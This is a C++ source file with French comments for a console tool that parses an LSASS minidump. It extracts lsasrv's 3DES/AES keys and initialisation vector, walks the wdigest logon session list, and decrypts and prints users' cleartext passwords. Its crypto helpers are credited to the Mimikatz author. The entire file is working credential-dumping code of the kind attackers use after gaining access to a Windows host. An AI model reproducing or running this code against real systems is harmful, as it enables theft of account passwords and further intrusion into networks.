// Password.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "PiF.h"
#include "Minidump.h"

int _tmain(int argc, _TCHAR* argv[])
{
	NTSTATUS status;
	PF_MAPFILE mapFile = { NULL, NULL, NULL, NULL };
	PF_MODULE_INFOS ModulesInfos[MAX_MODULES];
	KIWI_BCRYPT_GEN_KEY k3Des, kAes;
	BYTE InitializationVector[16];

	if (CoInitialize(NULL) != S_OK)
	{
		fwprintf_s(stdout, L"Erreur à l'initialisation COM\n");
		return 1;
	}

	_setmode(_fileno(stdout), _O_U8TEXT);
	_setmode(_fileno(stderr), _O_U8TEXT);
	SetConsoleOutputCP(CP_UTF8);

	if (argc < 2)
	{
		fwprintf(stdout, 
			L"Vous devez donner le nom et le chemin d'accès au fichier minidmp\n\n"
			L"Exemple:\n"
			L"\tC:\\Directory>PiF.exe C:\\Temporary\\lsass.dmp\n");
		return 0;
	}

	// Initialise les objets cryptos
	if (!NT_SUCCESS(PF_InitializeCrypto3DesProvider(&k3Des)))
	{
		fwprintf_s(stdout, L"Erreur à l'initialisation du crypto 3DES\n");
		return 1;
	}
	if (!NT_SUCCESS(PF_InitializeCryptoAesProvider(&kAes)))
	{
		fwprintf_s(stdout, L"Erreur à l'initialisation du crypto AES\n");
		return 1;
	}

	// Initialise le minidump
	if (!PF_InitMiniDump(&mapFile, argv[1]))
	{
		fwprintf_s(stdout, L"Erreur à l'initialisation du minidump\n");
		return 1;
	}

	// Récupère la liste des mémoires dans mapFile->pDir (toutes .data .text etc. soit 00000000`004d0000 ou encore 000007fe`fd38c830) en ajoutant l'offset fichier (RVA)
	if (!PF_InitMemoryStreamList(&mapFile))
	{
		fwprintf_s(stdout, L"Erreur à l'initialisation de la mémoire du mini dump.\n");
		return 1;
	}

	// recupère la liste des modules (lsasrv, wdigest etc...)
	if (!PF_GetModulesInformations(&mapFile, &ModulesInfos[0]))
	{
		fwprintf_s(stdout, L"Erreur à la lecture des informations des modules du minidump\n");
		return 1;
	}

	ULONG64 address = PF_FindAddressInMemoryForSymbol(L"lsasrv!h3DesKey", &ModulesInfos[0]);
	if (address == 0)
	{
		fwprintf_s(stdout, L"Impossible de trouver le symbole h3DesKey\n");
		return 1;
	}

	PBYTE ptr = PF_FindAddressInMemory(&mapFile, address, sizeof(ULONG64));
	if (ptr)
	{
		PF_AcquireKeyFromSymbol(&mapFile, ptr, &k3Des);
	}
	else
	{
		fwprintf_s(stdout, L"Impossible de trouver le symbole h3DesKey dans le minidump\n");
		return 1;
	}

	address = PF_FindAddressInMemoryForSymbol(L"lsasrv!hAesKey", &ModulesInfos[0]);
	if (address == 0)
	{
		fwprintf_s(stdout, L"Impossible de trouver le symbole hAesKey\n");
		return 1;
	}

	ptr = PF_FindAddressInMemory(&mapFile, address, sizeof(ULONG64));
	if (ptr)
	{
		PF_AcquireKeyFromSymbol(&mapFile, ptr, &kAes);
	}
	else
	{
		fwprintf_s(stdout, L"Impossible de trouver le symbole hAesKey dans le minidump\n");
	}

	address = PF_FindAddressInMemoryForSymbol(L"lsasrv!InitializationVector", &ModulesInfos[0]);
	if (address == 0)
	{
		fwprintf_s(stdout, L"Impossible de trouver le symbole InitializationVector\n");
		return 1;
	}

	ptr = PF_FindAddressInMemory(&mapFile, address, sizeof(ULONG64));
	if (ptr)
	{
		memcpy_s(&InitializationVector, sizeof(InitializationVector), ptr, sizeof(InitializationVector));
	}
	else
	{
		fwprintf_s(stdout, L"Impossible de trouver le symbole InitializationVector dans le minidump\n");
	}

	address = PF_FindAddressInMemoryForSymbol(L"wdigest!l_LogSessList", &ModulesInfos[0]);
	if (address == 0)
	{
		fwprintf_s(stdout, L"Impossible de trouver le symbole l_LogSessList\n");
		return 1;
	}

	ptr = PF_FindAddressInMemory(&mapFile, address, sizeof(ULONG64));
	if (ptr)
	{
		/*
		On va chercher dans la liste, les informations suivantes
		0:000> dd 01f0b250
		00000000`01f0b250  01e70790 00000000 fc7712c0 000007fe  --> FLink, BLink
		00000000`01f0b260  00000001 00000000 01f0b250 00000000  --> unk et This
		00000000`01f0b270  00fc9aa9 00000000 00000001 00000002  --> 00fc9aa9 00000000 LUid
		00000000`01f0b280  00180016 00000000 01fcb7d0 00000000  --> UserName len 16 max 18 value @01fcb7d0
		00000000`01f0b290  00060004 00000000 01ef2bb0 00000000  --> Domaine len 4 max 6 value @01ef2bb0
		00000000`01f0b2a0  00180012 00000000 01fcbc90 00000000  --> Password len 12 max 18 value @01fcbc90
		*/

		/* Prépare une LIST_ENTRY en mémoire pour accueillir les valeurs */
		PPF_LIST_ENTRY le = (PPF_LIST_ENTRY)LocalAlloc(LPTR, sizeof(PF_LIST_ENTRY));

		/* Lit le première entrée qui ne contient rien d'intéressent (à prioris) */
		memcpy_s(le, sizeof(PF_LIST_ENTRY), ptr, sizeof(PF_LIST_ENTRY));

		/* Tant qu'on a pas bouclé */
		while (le->FLink != address)
		{
			// Cherche l'entrée suivante
			ptr = PF_FindAddressInMemory(&mapFile, (ULONG64)le->FLink, 1);
			// Lit son contenu
			memcpy_s(le, sizeof(PF_LIST_ENTRY), ptr, sizeof(PF_LIST_ENTRY));

			if (le->Credentials.UserName.Length > 0)
			{
				// Dans le contenu il y a les valeurs UserName Domaine et Password
				// On commence par le username
				ptr = PF_FindAddressInMemory(&mapFile, (ULONG64)le->Credentials.UserName.Buffer, le->Credentials.UserName.MaximumLength);
				PWSTR userName = (PWSTR)LocalAlloc(LPTR, le->Credentials.UserName.MaximumLength);
				memcpy_s(userName, le->Credentials.UserName.MaximumLength, ptr, le->Credentials.UserName.MaximumLength);

				// Enstute le password
				ptr = PF_FindAddressInMemory(&mapFile, (ULONG64)le->Credentials.Password.Buffer, le->Credentials.Password.MaximumLength);
				PBYTE passWord = (PBYTE)LocalAlloc(LPTR, le->Credentials.Password.MaximumLength);
				memcpy_s(passWord, le->Credentials.Password.MaximumLength, ptr, le->Credentials.Password.MaximumLength);

				// On est prêt à décrypter!!! :)
				// On crée une copie de InitialisationVector car BCrypt* va le modifier
				BYTE LocalInitializationVector[16];
				memcpy_s(&LocalInitializationVector, sizeof(LocalInitializationVector), InitializationVector, sizeof(InitializationVector));

				BCRYPT_KEY_HANDLE *hKey;
				ULONG cbIV, cbResult;
				if (le->Credentials.Password.MaximumLength % 8)
				{
					hKey = &kAes.hKey;
					cbIV = sizeof(InitializationVector);
				}
				else
				{
					hKey = &k3Des.hKey;
					cbIV = sizeof(InitializationVector) / 2;
				}
				if (!NT_SUCCESS(BCryptDecrypt(*hKey, passWord, le->Credentials.Password.MaximumLength, 0, LocalInitializationVector, cbIV, passWord, le->Credentials.Password.MaximumLength, &cbResult, 0)))
				{
					fwprintf_s(stdout, L"Erreur BCrypt ???\n");
					return 1;
				}

				/* Reste à afficher */
				fwprintf_s(stdout, L"Username: %ls\tPassword: ", userName);

				int flag = IS_TEXT_UNICODE_STATISTICS;
				bool unicodeText = IsTextUnicode(passWord, le->Credentials.Password.MaximumLength, &flag);
				bool alpha = IsCharAlphaNumeric(passWord[0]);

				for (size_t i = 0; i < cbResult; i += 2)
				{
					if (alpha && unicodeText)
						fwprintf_s(stdout, L"%c", (WCHAR)passWord[i]);
					else
						fwprintf_s(stdout, L"%x", (WCHAR)passWord[i]);
				}
				fwprintf_s(stdout, L"\n");

				LocalFree(userName);
				LocalFree(passWord);
			}
		}
		// Libère les ressources de la liste
		LocalFree(le);
	}
	else
	{
		fwprintf_s(stdout, L"Impossible de trouver le symbole l_LogSessList dans le minidump\n");
	}

	// Cleanup
	if (k3Des.hProvider) BCryptCloseAlgorithmProvider(k3Des.hProvider, 0);
	if (k3Des.hKey)
		BCryptDestroyKey(k3Des.hKey);
	LocalFree(k3Des.pKey);

	if (kAes.hProvider) BCryptCloseAlgorithmProvider(kAes.hProvider, 0);
	if (kAes.hKey)
		BCryptDestroyKey(kAes.hKey);
	LocalFree(kAes.pKey);

	if (mapFile.hFile) PF_ReleaseMiniDumpMemoryList(&mapFile);

	CoUninitialize();
	return 0;
}

bool PF_AcquireKeyFromSymbol(PPF_MAPFILE pMapFile, PBYTE pKey, PKIWI_BCRYPT_GEN_KEY pGenKey)
{
	PVOID buffer; SIZE_T taille; LONG offset; KIWI_BCRYPT_HANDLE_KEY hKey; PKIWI_HARD_KEY pHardKey;
	if (pKey == NULL) return FALSE; // Si on a pas fait une recherche avant

	taille = sizeof(KIWI_BCRYPT_KEY);					// taille de KIWI_BCRYPT_KEY
	offset = FIELD_OFFSET(KIWI_BCRYPT_KEY, hardkey);	// offset où se trouve KIWI_HARD_KEY hardkey;

	if (buffer = LocalAlloc(LPTR, taille))
	{
		// on charge la valeur à cet endroit. Il s'agit d'un pointeur...
		LPVOID pointeur = NULL;
		memcpy_s(&pointeur, sizeof(PVOID), pKey, sizeof(PVOID));
		// on pointe maintenant au même endroit dans le minidump
		pKey = PF_FindAddressInMemory(pMapFile, (ULONG)pointeur, sizeof(KIWI_BCRYPT_HANDLE_KEY));
		// C'est là qu'on trouve la structure KIWI_BCRYPT_HANDLE_KEY
		memcpy_s(&hKey, sizeof(KIWI_BCRYPT_HANDLE_KEY), pKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));
		// Dans cette strucutre, on trouve maintenant key qui est un pointeur sur 
		// une structure KIWI_BCRYPT_KEY
		pKey = PF_FindAddressInMemory(pMapFile, (ULONG)hKey.key, sizeof(KIWI_BCRYPT_KEY));
		memcpy_s(buffer, sizeof(KIWI_BCRYPT_KEY), pKey, sizeof(KIWI_BCRYPT_KEY));
		// Dans laquelle on trouve un structure KIWI_HARD_KEY
		pHardKey = (PKIWI_HARD_KEY)((PBYTE)buffer + offset);
		// Cette structure comporte un champ cbSecret qui correspond à la taille de la clé
		pointeur = LocalAlloc(LPTR, pHardKey->cbSecret);
		// On se déplace dans la structure pour pointer à l'endroit contenant l'adresse de la clé (data)
		pKey = (PBYTE)hKey.key + offset + FIELD_OFFSET(KIWI_HARD_KEY, data);
		// data contient l'adresse mémoire où se trouve la clé
		pKey = PF_FindAddressInMemory(pMapFile, (ULONG)pKey, pHardKey->cbSecret);
		// on récupère la clé :)
		memcpy_s(pointeur, pHardKey->cbSecret, pKey, pHardKey->cbSecret);
		BCryptGenerateSymmetricKey(pGenKey->hProvider, &pGenKey->hKey, pGenKey->pKey, pGenKey->cbKey, (PUCHAR)pointeur, pHardKey->cbSecret, 0);
		LocalFree(pointeur);
		LocalFree(buffer);
	}
	return TRUE;
}

/*
FROM
Benjamin DELPY `gentilkiwi`
http://blog.gentilkiwi.com
benjamin@gentilkiwi.com
*/
NTSTATUS PF_InitializeCrypto3DesProvider(PKIWI_BCRYPT_GEN_KEY pProvider)
{
	NTSTATUS status;
	ULONG dwSizeNeeded;

	status = BCryptOpenAlgorithmProvider(&pProvider->hProvider, BCRYPT_3DES_ALGORITHM, NULL, 0);
	if (NT_SUCCESS(status))
	{
		status = BCryptSetProperty(pProvider->hProvider, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
		if (NT_SUCCESS(status))
		{
			status = BCryptGetProperty(pProvider->hProvider, BCRYPT_OBJECT_LENGTH, (PBYTE)&pProvider->cbKey, sizeof(pProvider->cbKey), &dwSizeNeeded, 0);
			if (NT_SUCCESS(status))
				pProvider->pKey = (PBYTE)LocalAlloc(LPTR, pProvider->cbKey);
		}
	}
	return status;
}

NTSTATUS PF_InitializeCryptoAesProvider(PKIWI_BCRYPT_GEN_KEY pProvider)
{
	NTSTATUS status;
	ULONG dwSizeNeeded;

	status = BCryptOpenAlgorithmProvider(&pProvider->hProvider, BCRYPT_AES_ALGORITHM, NULL, 0);
	if (NT_SUCCESS(status))
	{
		status = BCryptSetProperty(pProvider->hProvider, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CFB, sizeof(BCRYPT_CHAIN_MODE_CFB), 0);
		if (NT_SUCCESS(status))
		{
			status = BCryptGetProperty(pProvider->hProvider, BCRYPT_OBJECT_LENGTH, (PBYTE)&pProvider->cbKey, sizeof(pProvider->cbKey), &dwSizeNeeded, 0);
			if (NT_SUCCESS(status))
				pProvider->pKey = (PBYTE)LocalAlloc(LPTR, pProvider->cbKey);
		}
	}
	return status;
}